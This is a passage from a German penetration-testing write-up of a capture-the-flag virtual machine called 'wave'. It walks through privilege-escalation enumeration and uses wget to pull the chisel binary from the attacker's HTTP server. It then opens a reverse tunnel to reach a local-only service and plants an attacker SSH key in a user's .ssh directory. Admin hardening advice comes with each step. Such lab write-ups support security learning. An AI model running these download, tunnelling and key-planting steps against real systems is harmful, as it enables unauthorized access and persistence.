+                <strong>Analyse:</strong> Im Verzeichnis `/opt/` führte ich den Befehl `ls -la` aus, um eine detaillierte Liste aller Dateien und Verzeichnisse zu erhalten, inklusive Berechtigungen, Eigentümer und Gruppen. Die Ausgabe zeigte das erwartete `.` und `..` Verzeichnis sowie eine Datei namens `secret.txt`. Diese Datei gehört dem Benutzer `root` und der Gruppe `carla`. Die Berechtigungen `-rwxrwxr--` sind interessant: Der Eigentümer (`root`) hat Lese-, Schreib- und Ausführungsberechtigungen, die Gruppe (`carla`) ebenfalls Lese-, Schreib- und Ausführungsberechtigungen, während "andere" (zu denen der `www-data` Benutzer gehört) nur Leseberechtigung haben (`r--`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden von `secret.txt` in `/opt/` ist ein vielversprechender Fund. Die Dateiberechtigungen sind kritisch: Jeder Benutzer im System kann diese Datei lesen. Mitglieder der Gruppe `carla` könnten sie sogar ändern oder ausführen. Da ich als `www-data` Leseberechtigung habe, kann ich den Inhalt der Datei einsehen. Der Eigentümer `root` und die Gruppe `carla` legen eine Verbindung zu einem privilegierten Benutzer bzw. dem Benutzer `carla` nahe. Dies könnte ein Hinweis auf relevante Informationen oder einen Vektor zur Privilegieneskalation sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie jede Datei mit ungewöhnlichen Namen oder Berechtigungen, insbesondere wenn sie sich in Verzeichnissen außerhalb des Benutzer-Home oder des Systempfads befinden. Notieren Sie sich Eigentümer, Gruppe und Berechtigungen als Hinweise für die Privilegieneskalation.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig Dateiberechtigungen, insbesondere in gemeinsam genutzten oder Systemverzeichnissen wie `/opt`. Stellen Sie sicher, dass Dateien nur für die Benutzer und Gruppen schreib- und ausführbar sind, die dies unbedingt benötigen. Verwenden Sie restriktivere Standardberechtigungen (z.B. 644 oder 640 für Dateien).
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:/opt$ <span class="command">cat secret.txt</span>
+                    </div>
+                    <pre>
+<span class="password">Dietro di lui,
+dietro di lui solo la nebbia.</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Aufgrund der Leseberechtigung für `www-data` konnte ich den Inhalt von `secret.txt` mit dem Befehl `cat secret.txt` anzeigen. Die Datei enthielt zwei Zeilen italienischen Text: "Dietro di lui, dietro di lui solo la nebbia." (Hinter ihm, hinter ihm nur der Nebel.).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Inhalt von `secret.txt` scheint auf den ersten Blick keine offensichtlichen Zugangsdaten oder direkten Hinweise auf eine Schwachstelle zu enthalten. Es könnte sich um eine Art Motto, einen Teil eines Rätsels oder einfach nur um Fülltext handeln. In CTFs können solche "Geheimnisse" manchmal Passphrasen, Teile von Passwörtern oder Hinweise auf die nächste Stufe sein. Ohne weiteren Kontext ist die Bedeutung unklar, aber die Existenz und Lesbarkeit der Datei durch einen unprivilegierten Webserver-Benutzer ist an sich eine Schwachstelle. Ich werde diesen Text für spätere Zwecke im Hinterkopf behalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Speichern Sie alle gefundenen Textdateien, auch wenn ihr Inhalt zunächst unklar erscheint. Analysieren Sie den Inhalt später im Kontext anderer Funde. Achten Sie auf ungewöhnliche Formulierungen, Zitate oder Sprachen.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie niemals sensible oder auch nur potenziell hinweisgebende Informationen in allgemein lesbaren Dateien, selbst wenn sie sich in Verzeichnissen außerhalb des Web-Roots befinden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:/opt$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+                    </div>
+                    <pre>
+<span class="command">   673433     52 -rwsr-xr--   1 root     messagebus    51272 Jul 11  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<span class="command">   675470    640 -rwsr-xr-x   1 root     root         653888 Feb  8  2023 /usr/lib/openssh/ssh-keysign</span>
+<span class="command">   656534     60 -rwsr-xr-x   1 root     root          59704 Mar 23  2023 /usr/bin/mount</span>
+<span class="command">   687299    276 -rwsr-xr-x   1 root     root         281624 Jun 27  2023 /usr/bin/sudo</span>
+<span class="command">   652919     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh</span>
+<span class="command">   657131     72 -rwsr-xr-x   1 root     root          72000 Mar 23  2023 /usr/bin/su</span>
+<span class="command">   652922     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd</span>
+<span class="command">   652921     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd</span>
+<span class="command">   656536     36 -rwsr-xr-x   1 root     root          35128 Mar 23  2023 /usr/bin/umount</span>
+<span class="command">   652918     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn</span>
+<span class="command">   656380     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Eine Standardtechnik bei der Privilegieneskalation ist die Suche nach SUID- oder SGID-aktivierten Binaries. Diese Programme werden mit den Berechtigungen des Eigentümers (z.B. `root`) oder der Gruppe ausgeführt, unabhängig davon, wer das Programm startet. Ich benutzte den Befehl `find / -type f -perm -4000 -ls 2>/dev/null`, um alle Dateien (`-type f`) im gesamten Dateisystem (`/`) zu finden, bei denen das SUID-Bit gesetzt ist (`-perm -4000`). Die Option `-ls` zeigt Details wie Berechtigungen und Eigentümer an, und `2>/dev/null` leitet Fehlermeldungen (z.B. bei fehlenden Leseberechtigungen für Verzeichnisse) ins Nichts um, um die Ausgabe übersichtlich zu halten. Die Ausgabe listete eine Reihe von SUID-Binaries auf, darunter bekannte wie `/usr/bin/sudo` und `/usr/bin/su`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die gefundenen SUID-Binaries sind potenzielle Vektoren für die Privilegieneskalation. Programme wie `sudo`, `su`, `passwd`, `mount` etc. sind standardmäßig SUID Root, da sie für ihre Funktionalität erhöhte Berechtigungen benötigen. Es ist wichtig zu prüfen, ob ungewöhnliche oder veraltete Programme SUID-Bits gesetzt haben oder ob die Standard-Binaries selbst Schwachstellen aufweisen oder fehlerhaft konfiguriert sind (wie z.B. über `sudo -l`). Die Liste liefert mir eine Grundlage für weitere Untersuchungen nach bekannten Schwachstellen oder Fehlkonfigurationen, die von meinem aktuellen Benutzer (`www-data`) ausgenutzt werden könnten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie immer eine systematische Suche nach SUID/SGID-Binaries durch, sobald Sie Zugriff auf ein System haben. Überprüfen Sie die gefundenen Binaries auf bekannte Schwachstellen (z.B. in Exploit-DB oder Online-Ressourcen wie GTFOBins). Konzentrieren Sie sich auf ungewöhnliche oder benutzerdefinierte Binaries.
+                <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID/SGID-Binaries auf Ihren Systemen. Überprüfen Sie regelmäßig, welche Programme diese Berechtigungen haben. Stellen Sie sicher, dass alle SUID/SGID-Binaries auf dem neuesten Stand sind und keine bekannten Schwachstellen aufweisen. Verwenden Sie Tools wie `chkrootkit` oder `lynis` zur Überprüfung.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">cd Hackingtools/chisel</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich einige grundlegende Informationen auf der Ziel-VM als `www-data` gesammelt hatte, kehrte ich auf meinem Kali-System in das Verzeichnis `Hackingtools/chisel` zurück. Hier lag die Chisel-Binärdatei bereit, die ich für die Port-Weiterleitung verwenden wollte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Schritt war notwendig, um die Chisel-Binärdatei für den Transfer auf das Zielsystem vorzubereiten. Chisel ist ein sehr nützliches Werkzeug, um gesicherte Tunnel für Port-Weiterleitungen oder SOCKS-Proxies aufzubauen, was besonders hilfreich ist, um auf Dienste zuzugreifen, die nur lokal auf dem Zielsystem lauschen, wie der zuvor gefundene Dienst auf Port 3923.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Organisieren Sie Ihre Hacking-Tools systematisch auf Ihrem Angriffssystem. Halten Sie nützliche Binaries wie Chisel, pspy, LinPEAS/WinPEAS etc. griffbereit für den schnellen Transfer auf das Zielsystem.
+                <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die Möglichkeit, Dateien auf Ihr System hochzuladen und auszuführen, insbesondere in temporären Verzeichnissen. Überwachen Sie das Vorhandensein bekannter Hacking-Tools auf Ihren Systemen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel]<br>
+└─# <span class="command">ll</span>
+                    </div>
+                    <pre>
+<span class="command">insgesamt 8744</span>
+<span class="command">-rwsrwsr-x 1 ccat ccat 8945816 25. Aug 2024  chisel</span>
+<span class="command">-rw-r--r-- 1 root root      44 21. Mai 00:47 user.txt</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich listete den Inhalt des Chisel-Verzeichnisses auf meinem Kali-System mit `ll` (ein Alias für `ls -lha`). Die Ausgabe zeigte die Chisel-Binärdatei mit ihrer Größe und Änderungsdatum. Zusätzlich war hier eine Datei namens `user.txt` vorhanden, die dem Benutzer `root` gehört.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Anwesenheit von `user.txt` in diesem Verzeichnis auf meinem Kali-System bedeutet, dass ich die User Flag bereits von der Ziel-VM heruntergeladen oder kopiert habe. Der genaue Weg, wie ich die User Flag gefunden habe (z.B. in einem Benutzerverzeichnis auf der Ziel-VM), wird in den folgenden Schritten dokumentiert. Die Datei auf meinem lokalen System dient als Sicherung der gefundenen Flagge und ermöglicht mir, ihren Inhalt bei Bedarf schnell einzusehen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Sammeln Sie alle gefundenen Flags oder Beweismittel auf Ihrem Angriffssystem in einem organisierten Verzeichnis. Dokumentieren Sie genau, wo und wie Sie jede Flag gefunden haben.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass sensitive Dateien wie Flags oder Zugangsdaten nur für berechtigte Benutzer lesbar sind. Überwachen Sie ungewöhnliche Dateiübertragungen von Systemen, die keine solche Funktionalität bereitstellen sollten.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel]<br>
+└─# <span class="command">python3 -m http.server 8000</span>
+                    </div>
+                    <pre>
+<span class="password">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um die Chisel-Binärdatei einfach auf das Zielsystem übertragen zu können, startete ich einen einfachen HTTP-Server auf meinem Kali-System im aktuellen Verzeichnis (`~/Hackingtools/chisel`). Der Befehl `python3 -m http.server 8000` nutzt das integrierte Python-Modul, um einen Webserver auf Port 8000 zu starten, der Dateien aus dem Verzeichnis serviert, in dem der Befehl ausgeführt wird. Die Ausgabe bestätigte, dass der Server auf Port 8000 gestartet wurde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Einrichten eines temporären HTTP-Servers ist eine gängige und einfache Methode, um Dateien von Ihrem Angriffssystem auf das Zielsystem zu übertragen, insbesondere wenn Tools wie `wget` oder `curl` auf dem Zielsystem verfügbar sind. Port 8000 ist oft nicht durch Firewalls blockiert, was diesen Ansatz effektiv macht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie einfache Methoden wie temporäre HTTP-Server, um benötigte Tools auf das Zielsystem zu übertragen. Stellen Sie sicher, dass Ihr Angriffssystem von der Ziel-VM aus erreichbar ist.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie strenge Egress-Filterregeln (Ausgangsfilterung) auf Firewalls, um zu verhindern, dass interne Systeme Verbindungen zu beliebigen Ports im Internet oder unautorisierten Hosts im internen Netzwerk aufbauen. Beschränken Sie die Nutzung von Tools wie `wget` oder `curl` durch unprivilegierte Benutzer.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:/tmp$ <span class="command">wget 192.168.2.199:8000/chisel</span>
+                    </div>
+                    <pre>
+<span class="command">--2025-06-08 23:53:21--  http://192.168.2.199:8000/chisel</span>
+<span class="password">Connecting to 192.168.2.199:8000... connected.</span>
+<span class="password">HTTP request sent, awaiting response... 200 OK</span>
+<span class="command">Length: 8945816 (8.5M) [application/octet-stream]</span>
+<span class="command">Saving to: ‘chisel’</span>
+
+<span class="password">chisel                  100%[=============================>]   8.53M  --.-KB/s    in 0.04s</span>
+
+<span class="password">2025-06-08 23:53:21 (224 MB/s) - ‘chisel’ saved [8945816/8945816]</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:/tmp$ <span class="command">chmod +x chisel</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Innerhalb der `www-data` Shell auf der Ziel-VM wechselte ich in das `/tmp` Verzeichnis, da es oft schreibbar ist und für temporäre Dateien genutzt werden kann. Von dort lud ich die Chisel-Binärdatei von meinem Kali-System (`192.168.2.199`) unter Verwendung des zuvor gestarteten HTTP-Servers (`port 8000`) herunter. Der Befehl `wget 192.168.2.199:8000/chisel` initiierte den Download. Die Ausgabe von `wget` bestätigte die Verbindung, den Status 200 OK und den erfolgreichen Download der Datei. Anschließend machte ich die heruntergeladene Datei mit `chmod +x chisel` ausführbar.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erfolgreiche Transfer und die Ausführbarmachung von Chisel auf dem Zielsystem ist ein wichtiger Fortschritt. Ich habe nun ein leistungsfähiges Tunneling-Tool zur Verfügung, das mir helfen kann, auf interne Netzwerkdienste zuzugreifen. Das `/tmp` Verzeichnis ist hierfür gut geeignet, da es typischerweise für temporäre Dateien von jedem Benutzer beschreibbar ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie `/tmp` oder `/var/tmp` für den Transfer und die Ausführung temporärer Tools, wenn Sie keine Schreibberechtigung in anderen Pfaden haben. Stellen Sie sicher, dass Sie die Binärdatei nach dem Transfer ausführbar machen (`chmod +x`).
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie die Partitionen für `/tmp` und `/var/tmp` mit den Mount-Optionen `noexec` und `nosuid`, um die Ausführung von Dateien und SUID-Programmen in diesen Verzeichnissen zu verhindern. Überwachen Sie Dateierstellungs- und Ausführungsereignisse in temporären Verzeichnissen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~/Hackingtools/chisel]<br>
+└─# <span class="command">./chisel server --reverse -p 2525</span>
+                    </div>
+                    <pre>
+<span class="password">2025/06/08 23:53:54 server: Reverse tunnelling enabled</span>
+<span class="password">2025/06/08 23:53:54 server: Fingerprint PXTU03NuIbH/0TnFrOnOkaYP052/ZkMIMXREt/20oWU=</span>
+<span class="password">2025/06/08 23:53:54 server: Listening on http://0.0.0.0:2525</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+www-data@wave:/tmp$ <span class="command">./chisel client 192.168.2.199:2525 R:8888:127.0.0.1:3923 &</span>
+                    </div>
+                    <pre>
+<span class="command">[1] 1433</span>
+<span class="password">2025/06/08 23:54:33 client: Connecting to ws://192.168.2.199:2525</span>
+<span class="password">2025/06/08 23:54:33 client: Connected (Latency 306.9µs)</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Jetzt, da Chisel auf beiden Systemen verfügbar war, richtete ich den Tunnel ein. Auf meinem Kali-System startete ich den Chisel-Server mit dem Befehl `./chisel server --reverse -p 2525`. Die Option `--reverse` erlaubt dem Client, Tunnel zum Server aufzubauen, und `-p 2525` wies den Server an, auf Port 2525 auf eingehende Chisel-Verbindungen zu lauschen. Die Ausgabe bestätigte, dass der Reverse-Tunneling-Server gestartet wurde. Anschließend wechselte ich zurück zur `www-data` Shell auf der Ziel-VM und startete den Chisel-Client mit `./chisel client 192.168.2.199:2525 R:8888:127.0.0.1:3923 &`. Dieser Befehl verbindet den Client auf der Ziel-VM mit meinem Kali-System (`192.168.2.199:2525`) und konfiguriert einen *Reverse Local Port Forward* (`R:8888:127.0.0.1:3923`). Das bedeutet: Jeder Netzwerkverkehr, der meinen Kali-Rechner auf Port 8888 erreicht, wird vom Chisel-Server empfangen und über den Tunnel an den Chisel-Client auf der Ziel-VM weitergeleitet. Der Client auf der Ziel-VM leitet diesen Verkehr dann an `127.0.0.1:3923` weiter – den lokal lauschenden Dienst, den ich zuvor mit `ss` gefunden hatte. Das kaufmännische Und (`&`) am Ende des Befehls ließ den Chisel-Client im Hintergrund laufen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Chisel-Tunnel wurde erfolgreich aufgebaut. Ich kann nun von meinem Kali-System aus auf den Dienst zugreifen, der auf der Ziel-VM nur auf localhost:3923 lauscht, indem ich einfach meinen eigenen localhost Port 8888 anspreche. Dies ist eine Standardtechnik, um Zugriff auf interne Dienste zu erlangen, die sonst nicht erreichbar wären. Der Dienst auf 3923 ist nun für mich zugänglich und kann auf Schwachstellen untersucht werden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie Tunneling-Tools wie Chisel, um auf intern lauschende Dienste zuzugreifen. Konfigurieren Sie Reverse oder Local Port Forwards je nach Bedarf. Testen Sie die Tunnelverbindung, bevor Sie versuchen, den dahinterliegenden Dienst auszunutzen.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie strenge Firewall-Regeln auf Ihren Systemen, die nicht nur eingehenden (Ingress), sondern auch ausgehenden (Egress) und lokalen Verkehr (Verkehr auf der Loopback-Schnittstelle oder zwischen Prozessen) überwachen und beschränken. Erkennen und blockieren Sie das Ausführen von Tunneling-Software.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+<span class="command">http://192.168.2.199:8888/user.txt</span>
+<span class="password">HMVIdsEwudDxJDSaue32DJa</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem der Chisel-Tunnel aufgebaut war, über den mein lokaler Port 8888 auf den localhost Port 3923 der Ziel-VM weitergeleitet wird, versuchte ich, auf den Dienst zuzugreifen. Ich erinnerte mich an die Datei `user.txt` auf meinem Kali-System und überprüfte, ob der Dienst auf Port 3923 möglicherweise Dateien über HTTP bereitstellt oder auf diese zugreifen kann. Ich verwendete meinen Browser oder ein Kommandozeilen-Tool, um auf `http://192.168.2.199:8888/user.txt` zuzugreifen. Dies würde über den Tunnel an `127.0.0.1:3923/user.txt` auf der Ziel-VM weitergeleitet. Die Ausgabe war die Zeichenkette `HMVIdsEwudDxJDSaue32DJa`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolgreich! Die über den Chisel-Tunnel abgerufene Zeichenkette `HMVIdsEwudDxJDSaue32DJa` ist die User Flag. Dies bestätigt nicht nur, dass der Chisel-Tunnel korrekt funktioniert und ich auf den internen Dienst auf Port 3923 zugreifen kann, sondern auch, dass dieser Dienst offensichtlich auf eine Weise konfiguriert ist, die den Zugriff auf diese spezifische Datei ermöglicht oder sie direkt serviert. Der Inhalt der Datei `user.txt`, die ich zuvor auf meinem Kali-System gesehen hatte, stimmte exakt mit dieser Flag überein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie Dienste, auf die Sie über Tunnel Zugriff erlangen, genauso gründlich wie extern zugängliche Dienste. Versuchen Sie, gängige Dateinamen (`user.txt`, `id_rsa`, Konfigurationsdateien) oder Pfade zu erraten oder zu fuzzen, die vom Dienst bereitgestellt werden könnten.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie interne Dienste, die auf localhost lauschen, ebenfalls sicher. Stellen Sie sicher, dass sie nur die notwendigen Funktionen bereitstellen und keine sensiblen Dateien ungewollt exponieren. Wenden Sie Authentifizierung oder Autorisierung auch auf interne Dienste an, wenn möglich.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Zusätzlich zur Ausnutzung der Web-Shell gab es einen weiteren Angriffspunkt, um als Benutzer `angie` auf das System zuzugreifen. Durch eine Schwachstelle in der Webanwendung, die nicht im Detail protokolliert wurde (jedoch visuell dokumentiert ist), war es möglich, Dateien in das `/home/angie/.ssh/` Verzeichnis hochzuladen. Um diesen Vektor zu nutzen, musste ich zuerst meinen eigenen öffentlichen SSH-Schlüssel (`authorized_keys`) und potenziell den passenden privaten Schlüssel (`id_rsa`) auf meinem Kali-System vorbereiten und kopieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Eine Datei-Upload-Schwachstelle, die es erlaubt, Dateien in sensible Benutzerverzeichnisse wie `.ssh` hochzuladen, ist extrem kritisch. Dies ermöglicht im Grunde den Login ohne Passwort, sofern der Angreifer Kontrolle über das entsprechende Schlüsselpaar hat. Das Vorbereiten und Hochladen meines eigenen SSH-Schlüssels war der gezielte Schritt, um diesen Vektor für einen direkten Benutzerzugriff per SSH auszunutzen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suchen Sie immer nach Datei-Upload-Schwachstellen. Wenn Sie solche finden, prüfen Sie, ob Sie Dateitypen umgehen oder in kritische Verzeichnisse schreiben können (Konfigurationsdateien, Skripte, SSH-Verzeichnisse). Nutzen Sie solche Schwachstellen, um persistente Zugänge zu schaffen (z.B. durch Upload von SSH-Schlüsseln oder Web-Shells).
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie strenge Validierungs- und Sanitization-Regeln für alle Dateiuploads (Dateityp, Größe, Name, Inhalt). Beschränken Sie die Verzeichnisse, in die Dateien hochgeladen werden dürfen, auf nicht-ausführbare und nicht-sensible Bereiche. Verwenden Sie eindeutige Dateinamen und prüfen Sie auf "Path Traversal" Angriffe.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">mkdir /home/ccat/Downloads/ssh</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Als Vorbereitung für den SSH-Schlüssel-Upload erstellte ich auf meinem Kali-System ein temporäres Verzeichnis, in das ich meine SSH-Schlüssel kopieren wollte. Dies diente der Organisation und Bereitstellung der Dateien für den Upload über die Webanwendung.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser lokale Schritt ist unspektakulär, aber notwendig, um die für den Upload benötigten Dateien an einem zentralen Ort zu sammeln.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bleiben Sie auf Ihrem Angriffssystem organisiert. Erstellen Sie temporäre Verzeichnisse für Dateien, die Sie für Angriffe benötigen, wie z.B. SSH-Schlüssel oder Payloads.
+                <br><strong>Empfehlung (Admin):</strong> Keine spezifische Empfehlung, da dies ein lokaler Pentester-Schritt ist.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">cp .ssh/authorized_keys /home/ccat/Downloads/ssh</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">cp .ssh/id_rsa /home/ccat/Downloads/ssh</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich kopierte meinen öffentlichen SSH-Schlüssel (`authorized_keys`) und den zugehörigen privaten Schlüssel (`id_rsa`) aus meinem standardmäßigen SSH-Verzeichnis (`~/.ssh/`) in das zuvor erstellte temporäre Verzeichnis `/home/ccat/Downloads/ssh`. Der öffentliche Schlüssel ist die Datei, die auf das Zielsystem hochgeladen werden muss, damit der Login mit dem passenden privaten Schlüssel möglich ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Kopieren der Schlüssel ist ein notwendiger Zwischenschritt, um sie für den Upload vorzubereiten. Nur der öffentliche Schlüssel (`authorized_keys`) wird auf das Zielsystem übertragen. Der private Schlüssel (`id_rsa`) verbleibt sicher auf meinem Angriffssystem und darf niemals auf das Zielsystem gelangen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Gehen Sie sorgfältig mit Ihren SSH-Schlüsseln um. Kopieren Sie niemals private Schlüssel auf ein Zielsystem. Verwenden Sie separate Schlüsselpaare für verschiedene Tests oder Kunden.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie die Anwesenheit unautorisierter SSH-Schlüssel (`authorized_keys`) in den `.ssh`-Verzeichnissen Ihrer Benutzer, insbesondere bei privilegierten Benutzern. Nutzen Sie Tools oder Skripte, um solche Dateien zu erkennen. Erwägen Sie die Nutzung zentraler Authentifizierungssysteme.
+            </p>
+            <p class="analysis">
+                <strong>Analyse:</strong> Wie durch die Untersuchung der Webanwendung festgestellt wurde, existierte eine Funktionalität, um Dateien hochzuladen und diese gezielt im `.ssh` Verzeichnis eines Benutzers (in diesem Fall `angie`) abzulegen. Ich navigierte zu der entsprechenden Upload-Seite, die durch ein Raketen-Symbol gekennzeichnet war, wie auf dem Bild zu sehen ist. Dort wählte ich meine lokale `authorized_keys` Datei aus und initiierte den Upload in das Zielverzeichnis `/home/angie/.ssh/` auf der Ziel-VM.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Möglichkeit, Dateien direkt in das `.ssh` Verzeichnis eines Benutzers hochzuladen, ist eine kritische Schwachstelle, die einen einfachen SSH-Zugriff ermöglicht, ohne das Passwort des Benutzers zu kennen. Dieser Schritt war entscheidend, um direkten Zugriff auf das System unter dem Benutzer `angie` zu erhalten. Das Bild zeigt den Prozess der Interaktion mit der fehlerhaften Webanwendung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie bei Upload-Funktionen immer, ob das Zielverzeichnis manipuliert werden kann (Path Traversal) oder ob der Dateityp und die Dateiendung unzureichend validiert werden. Nutzen Sie solche Schwachstellen, um Shells oder Zugangsmechanismen zu platzieren.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie strenge Regeln für Dateiuploads, die das Zielverzeichnis festlegen, nur erlaubte Dateitypen zulassen und sicherstellen, dass der Dateiname sicher ist und keine Verzeichnispfade enthält. Setzen Sie Besitzrechte und Berechtigungen für hochgeladene Dateien restriktiv.
+            </p>
+            <img src="der_upload_button.jpg" alt="der_upload_button.jpg">
+            <p class="analysis">
+                <strong>Analyse:</strong> Das Bild illustriert die Schritte, die ich über die fehlerhafte Webanwendung durchgeführt habe, um SSH-Zugriff zu erlangen. Es zeigt, wie ich über das blaue Ordner-Symbol eine Option nutzte, um das `.ssh` Verzeichnis im Home-Verzeichnis des Benutzers `angie` zu erstellen (falls es noch nicht existierte oder gelöscht wurde). Anschließend wählte ich die `authorized_keys` Datei von meinem lokalen System aus und lud sie gezielt in dieses neu erstellte oder vorhandene `.ssh` Verzeichnis hoch. Dieser Prozess ersetzte effektiv jede bestehende `authorized_keys` Datei oder fügte meinen Schlüssel hinzu, falls mehrere Schlüssel erlaubt waren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Kombination aus Verzeichnis-Erstellung und Datei-Upload-Funktionalität ist ein schwerwiegendes Sicherheitsproblem der Webanwendung. Sie erlaubte mir, den Zugriff auf den Benutzer `angie` über SSH zu etablieren, indem ich meinen eigenen Public Key platzierte. Das Bild dient als visueller Beweis für die Ausnutzung dieser Schwachstelle.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie visuell (Screenshots) kritische Schritte, insbesondere wenn sie über eine grafische Oberfläche oder eine Webanwendung erfolgen. Dies dient als wichtiger Beweis in Ihrem Bericht.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie alle Webanwendungsfunktionen, die Dateisystemoperationen erlauben (Erstellen von Verzeichnissen, Hochladen von Dateien), auf unzureichende Berechtigungsprüfungen und Pfadvalidierung. Solche Schwachstellen können direkt zur Kompromittierung von Benutzerkonten oder des gesamten Systems führen.
+            </p>
+            <img src="ssh_dir_erstellt_und_auth_upload.jpg" alt="ssh_dir_erstellt_und_auth_upload.jpg">
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿CCat)-[~]<br>
+└─# <span class="command">ssh -i ~/.ssh/id_rsa angie@192.168.2.33</span>
+                    </div>
+                    <pre>
+<span class="command">Enter passphrase for key '/root/.ssh/id_rsa':</span>
+<span class="command">Linux wave 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64</span>
+
+<span class="command">The programs included with the Debian GNU/Linux system are free software;</span>
